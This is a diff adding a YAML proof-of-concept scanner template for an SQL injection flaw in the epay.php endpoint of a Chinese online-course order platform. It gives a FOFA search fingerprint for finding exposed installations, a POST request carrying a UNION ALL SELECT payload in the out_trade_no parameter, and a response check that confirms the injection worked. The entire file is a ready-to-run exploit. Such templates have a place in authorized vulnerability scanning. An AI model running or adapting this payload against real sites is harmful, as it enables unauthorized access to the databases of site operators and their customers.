@@ -1,0 +1,21 @@
+id: poc-yaml-29-online-class-delivery-platform-epay-php-sqli
+info:
+  name: 29网课交单平台 epay.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 29网课交单平台
+  fofa: body="/apisub.php"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /epay/epay.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: out_trade_no=' UNION ALL SELECT 1,CONCAT(IFNULL(CAST(MD5({{.t1}}) AS CHAR),0x20)),3,4,5,6,7,8,9,10,11,12,13--
+    -
+  expression: "status_code == 200 && \ncontains(body,\"alipaysubmit\") &&\ncontains(body,\"\
+    out_trade_no\") &&\ncontains(body,t2)\n"
+transport: http
